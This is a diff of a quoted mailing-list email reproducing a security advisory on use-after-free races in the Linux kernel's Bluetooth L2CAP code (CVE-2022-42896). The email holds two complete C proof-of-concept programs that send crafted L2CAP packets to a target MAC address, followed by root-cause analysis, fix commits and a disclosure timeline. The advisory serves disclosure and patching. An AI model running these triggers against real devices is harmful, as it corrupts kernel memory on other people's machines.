-> > > #include <stdlib.h>
-> > > #include <unistd.h>
-> > > #include <sys/socket.h>
-> > > #include <sys/uio.h>
-> > > #include <bluetooth/bluetooth.h>
-> > > #include <bluetooth/l2cap.h>
-> > > #include <bluetooth/hci.h>
-> > > #include <bluetooth/hci_lib.h>
-> > > typedef struct l2cap_le_conn_req {
-> > >         uint16_t     psm;
-> > >         uint16_t     scid;
-> > >         uint16_t     mtu;
-> > >         uint16_t     mps;
-> > >         uint16_t     credits;
-> > > } __attribute__ ((packed)) l2cap_le_conn_req;
-> > > int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
-> > > uint16_t data_length) {
-> > >   uint8_t type =3D HCI_ACLDATA_PKT;
-> > >   uint16_t BCflag =3D 0x0000;
-> > >   uint16_t PBflag =3D 0x0002;
-> > >   uint16_t flags =3D ((BCflag << 2) | PBflag) & 0x000F;
-> > >
-> > >   hci_acl_hdr hdr;
-> > >   hdr.handle =3D htobs(acl_handle_pack(hci_handle, flags));
-> > >   hdr.dlen =3D data_length;
-> > >
-> > >   struct iovec iv[3];
-> > >
-> > >   iv[0].iov_base =3D &type;
-> > >   iv[0].iov_len =3D 1;
-> > >   iv[1].iov_base =3D &hdr;
-> > >   iv[1].iov_len =3D HCI_ACL_HDR_SIZE;
-> > >   iv[2].iov_base =3D data;
-> > >   iv[2].iov_len =3D data_length;
-> > >
-> > >   return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
-> > > }
-> > >
-> > > #define L2CAP_CID_LE_SIGNALING  0x0005
-> > > #define L2CAP_LE_CONN_REQ       0x14
-> > > #define L2CAP_CID_SMP           0x0006
-> > > #define L2CAP_CID_SMP_BREDR     0x0007
-> > > int main(int argc, char **argv) {
-> > >   if (argc !=3D 2) {
-> > >     printf("Usage: %s MAC_ADDR\n", argv[0]);
-> > >     return 1;
-> > >   }
-> > >
-> > >   bdaddr_t dst_addr;
-> > >   str2ba(argv[1], &dst_addr);
-> > >
-> > >   printf("[*] Resetting hci0 device...\n");
-> > >   system("sudo hciconfig hci0 down");
-> > >   system("sudo hciconfig hci0 up");
-> > >
-> > >   printf("[*] Opening hci device...\n");
-> > >   struct hci_dev_info di;
-> > >   int hci_device_id =3D hci_get_route(NULL);
-> > >   int hci_socket =3D hci_open_dev(hci_device_id);
-> > >   if (hci_devinfo(hci_device_id, &di) < 0) {
-> > >     perror("hci_devinfo");
-> > >     return 1;
-> > >   }
-> > >
-> > >   struct hci_filter flt;
-> > >   hci_filter_clear(&flt);
-> > >   hci_filter_all_ptypes(&flt);
-> > >   hci_filter_all_events(&flt);
-> > >   if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) <
-> > 0) {
-> > >     perror("setsockopt(HCI_FILTER)");
-> > >     return 1;
-> > >   }
-> > >
-> > >   int opt =3D 1;
-> > >   if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)=
-) <
-> > 0) {
-> > >     perror("setsockopt(HCI_DATA_DIR)");
-> > >     return 1;
-> > >   }
-> > >
-> > >   printf("[*] Connecting to victim...\n");
-> > >
-> > >   struct sockaddr_l2 laddr =3D {0};
-> > >   laddr.l2_family =3D AF_BLUETOOTH;
-> > >   laddr.l2_bdaddr_type =3D BDADDR_LE_PUBLIC;
-> > >   laddr.l2_bdaddr =3D di.bdaddr;
-> > >
-> > >   struct sockaddr_l2 raddr =3D {0};
-> > >   raddr.l2_family =3D AF_BLUETOOTH;
-> > >   raddr.l2_bdaddr_type =3D BDADDR_LE_PUBLIC;
-> > >   raddr.l2_bdaddr =3D dst_addr;
-> > >
-> > >   int l2_sock;
-> > >   printf("[*] socket\n");
-> > >   if ((l2_sock =3D socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0=
-) {
-> > >     perror("socket");
-> > >     return 1;
-> > >   }
-> > >
-> > >   printf("[*] bind\n");
-> > >   if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
-> > >     perror("bind");
-> > >     return 1;
-> > >   }
-> > >
-> > >   printf("[*] connect\n");
-> > >   if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0)=
- {
-> > >     perror("connect");
-> > >     return 1;
-> > >   }
-> > >
-> > >   printf("[*] getsockopt\n");
-> > >   struct l2cap_conninfo l2_conninfo;
-> > >   socklen_t l2_conninfolen =3D sizeof(l2_conninfo);
-> > >   if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
-> > > &l2_conninfolen) < 0) {
-> > >     perror("getsockopt");
-> > >     return 1;
-> > >   }
-> > >
-> > >   uint16_t hci_handle =3D l2_conninfo.hci_handle;
-> > >   printf("[+] HCI handle: %x\n", hci_handle);
-> > >
-> > >   struct {
-> > >     l2cap_hdr hdr;
-> > >     l2cap_cmd_hdr cmd_hdr;
-> > >     l2cap_le_conn_req req;
-> > >   } packet =3D {0};
-> > >   packet.hdr.len =3D htobs(sizeof(packet) - L2CAP_HDR_SIZE);
-> > >   packet.hdr.cid =3D htobs(L2CAP_CID_LE_SIGNALING);
-> > >   packet.cmd_hdr.code =3D L2CAP_LE_CONN_REQ;
-> > >   packet.cmd_hdr.ident =3D 0x1;
-> > >   packet.cmd_hdr.len =3D sizeof(packet.req);
-> > >   packet.req.psm =3D htobs(0);
-> > >   packet.req.scid =3D htobs(0x42);
-> > >   packet.req.mtu =3D htobs(23);
-> > >   packet.req.mps =3D htobs(23);
-> > >   packet.req.credits =3D htobs(0xff);
-> > >
-> > >   printf("[*] Sending malicious L2CAP packet...\n");
-> > >   hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
-> > >
-> > >   close(l2_sock);
-> > >   hci_close_dev(hci_socket);
-> > >
-> > >   return 0;
-> > > }
-> > >
-> > > ```
-> > >
-> > > *UAF write in l2cap_connect*
-> > >
-> > > *```*
-> > >
-> > > #include <stdlib.h>
-> > > #include <unistd.h>
-> > > #include <sys/socket.h>
-> > > #include <sys/uio.h>
-> > > #include <bluetooth/bluetooth.h>
-> > > #include <bluetooth/l2cap.h>
-> > > #include <bluetooth/hci.h>
-> > > #include <bluetooth/hci_lib.h>
-> > > int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
-> > > uint16_t data_length) {
-> > >   uint8_t type =3D HCI_ACLDATA_PKT;
-> > >   uint16_t BCflag =3D 0x0000;
-> > >   uint16_t PBflag =3D 0x0002;
-> > >   uint16_t flags =3D ((BCflag << 2) | PBflag) & 0x000F;
-> > >
-> > >   hci_acl_hdr hdr;
-> > >   hdr.handle =3D htobs(acl_handle_pack(hci_handle, flags));
-> > >   hdr.dlen =3D data_length;
-> > >
-> > >   struct iovec iv[3];
-> > >
-> > >   iv[0].iov_base =3D &type;
-> > >   iv[0].iov_len =3D 1;
-> > >   iv[1].iov_base =3D &hdr;
-> > >   iv[1].iov_len =3D HCI_ACL_HDR_SIZE;
-> > >   iv[2].iov_base =3D data;
-> > >   iv[2].iov_len =3D data_length;
-> > >
-> > >   return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
-> > > }
-> > >
-> > > #define L2CAP_CID_SIGNALING     0x0001
-> > > #define L2CAP_CONN_REQ          0x02
-> > > #define L2CAP_CID_SMP           0x0006
-> > > #define L2CAP_CID_SMP_BREDR     0x0007
-> > > int main(int argc, char **argv) {
-> > >   if (argc !=3D 2) {
-> > >     printf("Usage: %s MAC_ADDR\n", argv[0]);
-> > >     return 1;
-> > >   }
-> > >
-> > >   bdaddr_t dst_addr;
-> > >   str2ba(argv[1], &dst_addr);
-> > >
-> > >   printf("[*] Resetting hci0 device...\n");
-> > >   system("sudo hciconfig hci0 down");
-> > >   system("sudo hciconfig hci0 up");
-> > >
-> > >   printf("[*] Opening hci device...\n");
-> > >   struct hci_dev_info di;
-> > >   int hci_device_id =3D hci_get_route(NULL);
-> > >   int hci_socket =3D hci_open_dev(hci_device_id);
-> > >   if (hci_devinfo(hci_device_id, &di) < 0) {
-> > >     perror("hci_devinfo");
-> > >     return 1;
-> > >   }
-> > >
-> > >   struct hci_filter flt;
-> > >   hci_filter_clear(&flt);
-> > >   hci_filter_all_ptypes(&flt);
-> > >   hci_filter_all_events(&flt);
-> > >   if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) <
-> > 0) {
-> > >     perror("setsockopt(HCI_FILTER)");
-> > >     return 1;
-> > >   }
-> > >
-> > >   int opt =3D 1;
-> > >   if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)=
-) <
-> > 0) {
-> > >     perror("setsockopt(HCI_DATA_DIR)");
-> > >     return 1;
-> > >   }
-> > >
-> > >   printf("[*] Connecting to victim...\n");
-> > >
-> > >   struct sockaddr_l2 laddr =3D {0};
-> > >   laddr.l2_family =3D AF_BLUETOOTH;
-> > >   laddr.l2_bdaddr_type =3D BDADDR_BREDR;
-> > >   laddr.l2_bdaddr =3D di.bdaddr;
-> > >
-> > >   struct sockaddr_l2 raddr =3D {0};
-> > >   raddr.l2_family =3D AF_BLUETOOTH;
-> > >   raddr.l2_bdaddr_type =3D BDADDR_BREDR;
-> > >   raddr.l2_bdaddr =3D dst_addr;
-> > >
-> > >   int l2_sock;
-> > >   printf("[*] socket\n");
-> > >   if ((l2_sock =3D socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0=
-) {
-> > >     perror("socket");
-> > >     return 1;
-> > >   }
-> > >
-> > >   printf("[*] bind\n");
-> > >   if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
-> > >     perror("bind");
-> > >     return 1;
-> > >   }
-> > >
-> > >   printf("[*] connect\n");
-> > >   if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0)=
- {
-> > >     perror("connect");
-> > >     return 1;
-> > >   }
-> > >
-> > >   printf("[*] getsockopt\n");
-> > >   struct l2cap_conninfo l2_conninfo;
-> > >   socklen_t l2_conninfolen =3D sizeof(l2_conninfo);
-> > >   if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
-> > > &l2_conninfolen) < 0) {
-> > >     perror("getsockopt");
-> > >     return 1;
-> > >   }
-> > >
-> > >   uint16_t hci_handle =3D l2_conninfo.hci_handle;
-> > >   printf("[+] HCI handle: %x\n", hci_handle);
-> > >
-> > >   struct {
-> > >     l2cap_hdr hdr;
-> > >     l2cap_cmd_hdr cmd_hdr;
-> > >     l2cap_conn_req req;
-> > >   } packet =3D {0};
-> > >   packet.hdr.len =3D htobs(sizeof(packet) - L2CAP_HDR_SIZE);
-> > >   packet.hdr.cid =3D htobs(L2CAP_CID_SIGNALING);
-> > >   packet.cmd_hdr.code =3D L2CAP_CONN_REQ;
-> > >   packet.cmd_hdr.ident =3D 0x1;
-> > >   packet.cmd_hdr.len =3D sizeof(packet.req);
-> > >   packet.req.psm =3D htobs(0);
-> > >   packet.req.scid =3D htobs(0x42);
-> > >
-> > >   printf("[*] Sending malicious L2CAP packet...\n");
-> > >   hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
-> > >
-> > >   close(l2_sock);
-> > >   hci_close_dev(hci_socket);
-> > >
-> > >   return 0;
-> > > }
-> > >
-> > > ```
-> > >
-> > > To make SMP available for BR/EDR devices (in case of a hardware
-> > supporting
-> > > it is not available), you can force it by running: echo Y >
-> > > /sys/kernel/debug/bluetooth/hci0/force_bredr_smp
-> > > Further Analysis
-> > >
-> > > *Bug Analysis*
-> > > There are UAF races in l2cap_connect
-> > > <
-> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7e=
-e43b5aaf/net/bluetooth/l2cap_core.c#L4113
-> > >
-> > >  and l2cap_le_connect_req
-> > > <
-> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7e=
-e43b5aaf/net/bluetooth/l2cap_core.c#L5789
-> > >
-> > > methods.
-> > > After a channel is created via the new_connection callback, it is not
-> > > locked but __set_chan_timer sets up a timer which can call
-> > > l2cap_chan_timeout and can cleanup the channel before the method
-> > finishes,
-> > > causing UAF read in l2cap_le_connect_req
-> > > <
-> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7e=
-e43b5aaf/net/bluetooth/l2cap_core.c#L5899
-> > >
-> > >  and UAF write in l2cap_connect
-> > > <
-> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7e=
-e43b5aaf/net/bluetooth/l2cap_core.c#L4247
-> > >
-> > > .
-> > >
-> > > As the channel timeout is normally 40 seconds
-> > > <
-> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7e=
-e43b5aaf/include/net/bluetooth/l2cap.h#L55
-> > >
-> > >  (L2CAP_CONN_TIMEOUT), winning the race would be infeasible, but due =
-to a
-> > > bug in SMP's implementation, SMP channels created by smp_new_conn_cb
-> > > <
-> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7e=
-e43b5aaf/net/bluetooth/smp.c#L3241
-> > >
-> > > have
-> > > their get_sndtimeo callback set to l2cap_chan_no_get_sndtimeo which
-> > returns
-> > > 0
-> > > <
-> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7e=
-e43b5aaf/include/net/bluetooth/l2cap.h#L964
-> > >
-> > > as
-> > > timeout value thus causing the timer to run immediately (on a differe=
-nt
-> > > thread) after the __set_chan_timer call.
-> > >
-> > > Note: in l2cap_le_connect_req (without FLAG_DEFER_SETUP), the timer is
-> > > canceled via the l2cap_chan_ready call almost immediately after the
-> > > __set_chan_timer call, but even this small time window enough for the
-> > timer
-> > > with 0 timeout to start.
-> > >
-> > > Another root cause of the issue can be that the SMP channel is availa=
-ble
-> > > via l2cap_global_chan_by_psm if the request contains psm=3D0. Multiple
-> > > channels can be registered without PSM (PSM is 0, and channel is
-> > identified
-> > > by SCID) but only one of them is returned (which needs to be SMP to be
-> > able
-> > > to trigger the vulnerability).
-> > >
-> > > ```
-> > >
-> > > static int l2cap_le_connect_req(...)
-> > > {
-> > >     ...
-> > >     mutex_lock(&conn->chan_lock);
-> > >     ...
-> > >     chan =3D pchan->ops->new_connection(pchan); // chan is not locked
-> > >     ...
-> > >     __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
-> > > l2cap_chan_timeout running from a different thread
-> > >     ...
-> > >     if (test_bit(FLAG_DEFER_SETUP, &chan->flags)) { // branch usually
-> > not taken
-> > >         ...
-> > >     } else {
-> > >         l2cap_chan_ready(chan); // calls __clear_chan_timer(chan),
-> > resets timer
-> > >         result =3D L2CAP_CR_LE_SUCCESS;
-> > >     }
-> > >     ...
-> > >     mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
-> > > until this call
-> > >     ...
-> > >     if (chan) { // [7] UAF read
-> > >         rsp.mtu =3D cpu_to_le16(chan->imtu);
-> > >         rsp.mps =3D cpu_to_le16(chan->mps);
-> > >     } else {
-> > >     ...
-> > > }
-> > >
-> > > ```
-> > >
-> > > Similar issue within l2cap_connect:
-> > >
-> > > ```
-> > >
-> > > static struct l2cap_chan *l2cap_connect(...)
-> > > {
-> > >     ...
-> > >     mutex_lock(&conn->chan_lock);
-> > >     ...
-> > >     chan =3D pchan->ops->new_connection(pchan); // chan is not locked
-> > >     ...
-> > >     __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
-> > > l2cap_chan_timeout running from a different thread
-> > >     ...
-> > >     mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
-> > > until this call
-> > >     ...
-> > >     if (chan && !test_bit(CONF_REQ_SENT, &chan->conf_state) && // UAF
-> > read
-> > >         result =3D=3D L2CAP_CR_SUCCESS) {
-> > >         u8 buf[128];
-> > >         set_bit(CONF_REQ_SENT, &chan->conf_state); // UAF write
-> > >         l2cap_send_cmd(conn, l2cap_get_ident(conn), L2CAP_CONF_REQ,
-> > >                    l2cap_build_conf_req(chan, buf, sizeof(buf)), buf);
-> > >         chan->num_conf_req++;
-> > >     }
-> > >     return chan;
-> > > }
-> > >
-> > > ```
-> > >
-> > > The affected code path in SMP implementation:
-> > >
-> > > ```
-> > >
-> > > static inline struct l2cap_chan *smp_new_conn_cb(struct l2cap_chan
-> > *pchan)
-> > > {
-> > >     =E2=80=A6
-> > >     chan->ops =3D &smp_chan_ops;
-> > >     =E2=80=A6
-> > > }
-> > > static const struct l2cap_ops smp_chan_ops =3D {
-> > >     =E2=80=A6
-> > >     .get_sndtimeo =3D l2cap_chan_no_get_sndtimeo,
-> > >     =E2=80=A6
-> > > };
-> > > static inline long l2cap_chan_no_get_sndtimeo(struct l2cap_chan *chan)
-> > > {
-> > >     return 0;
-> > > }
-> > >
-> > > ```
-> > >
-> > > *Reachability*
-> > > SMP channel is available for Bluetooth Low Energy since BT 4.0 (~2009)
-> > > which can be used to trigger the UAF read in l2cap_le_connect_req, an=
-d it
-> > > is also available for BT BR/EDR since BT 5.2 (~2020, to support Secure
-> > > Connections) to trigger the UAF write in l2cap_connect.
-> > >
-> > > No other prerequisites were found, the bugs were triggered on a
-> > > KASAN-enabled Ubuntu 22.04 kernel (an artificial delay was added befo=
-re
-> > the
-> > > UAF read/write to make winning the race easier).
-> > >
-> > > Note: it is possible that the bugs can be triggered via other channels
-> > > which may be created automatically by the specific environment.
-> > > Patch
-> > >
-> > > The vulnerability was fixed by not accepting 0 as a valid PSM value in
-> > > commit 711f8c3
-> > > <
-> > https://github.com/torvalds/linux/commit/711f8c3fb3db61897080468586b970=
-c87c61d9e4
-> > >
-> > > and
-> > > by preventing l2cap_global_chan_by_psm to give back L2CAP_CHAN_FIXED
-> > channels
-> > > in commit f937b75
-> > > <
-> > https://github.com/torvalds/linux/commit/f937b758a188d6fd328a81367087ed=
-dbb2fce50f
-> > >
-> > > .
-> > > Timeline
-> > >
-> > > *Date reported*: 10/06/2022
-> > > *Date fixed*: 10/26/2022
-> > > *Date disclosed*: 11/28/2022
-> >
-> > According to
-> >
-> > https://github.com/google/security-research/security/advisories/GHSA-pf=
-87-6c9q-jvm4
-> > this should have CVE-2022-42896 assigned.
-> >
-> > Regards,
-> > Salvatore
-> >
+--------------QAlHIM650fddVDn4ZWe7sF0T--
 
---NkTcwObf9/6QfcH8
-Content-Type: application/pgp-signature; name="signature.asc"
+--------------McsT3od8vatL7WmkiOWDElPT
+Content-Type: application/pgp-signature; name="OpenPGP_signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="OpenPGP_signature.asc"
 
 -----BEGIN PGP SIGNATURE-----
 
-iHUEABYKAB0WIQQyG9yfCrmO0LPSdG2gXq2+aa/JtQUCY5uFMgAKCRCgXq2+aa/J
-tdq1AQCxGYs1ekGsl/3Jnn+lmfjTm0b/VwmDgmu5e90S/lHQvgD/fgtNDIliV6oR
-5IJ348YflcdP8i8kE/N22Fb36Mo+Twk=
-=EGBa
+wsF5BAABCAAjFiEEL328rVsw5mi71RbBz98UiCjGQqcFAmUcQeAFAwAAAAAACgkQz98UiCjGQqfg
+Sw/+Pv50xkCyfdi9nLSIkL+C2+g4MtrMtuV2DyTe+6q3fbXVn+mYN94dLJ+ENL024mENEKvZqohP
+Dc7sGZT2+FrZ2XuZjcnQL9RseZ9V1oKsU4JhEfEILYuCvsyARf4rwn6pMohfC3NMbvIqNEtIy9QH
+BbpLxvBaDqMyBx5QQOT6171IFb8SpRNdl39rjnxrqf9iS1MsQNQn2uEhgc+AKxO1viEM370mNJMz
+SAXlb4xtxWZeX2ckVcE6H9JUgy78PzJszX6UqIz2lkulWL0ahSj/04WEhhRqHq/1IV2gOLxGIe7a
+mknOp+lvyq8nXm6HTr1CJPqGvT7ejs/8AlW/tQVbrW6frzY0scecSlhXns9RrcJPpXgxYJefdcQ6
+/ln5rwfFwiB2aSG+ZVaSto/D6LCtxX+m6z6r4IsqrJaa+1COwaxRghZId4wzagSg8gfwdHZW4UIr
+c11FKF0k6lD9zLDhxNaJ3ney5r3t2EBaUxmKT5IZZYM/aYeOpY5teh7/U63iaeiM0xboIHC5SaIg
+GoEUaxRgenAODxlMME3sF/zMYmJQ3QwfvVcB1PTjEfs+xUu45/rWr8Ft6+Fr5JmCfjSoSc7wij7I
+ZFQ5VGd9yIzpbgCzBG4+n8bu47mMT3mDGMDl5kaxkKBgDR7Fam2SRwdmC6SKqwEc9C5Q2A1L1KNQ
+ZfI=
+=plo2
 -----END PGP SIGNATURE-----
 
---NkTcwObf9/6QfcH8--
+--------------McsT3od8vatL7WmkiOWDElPT--
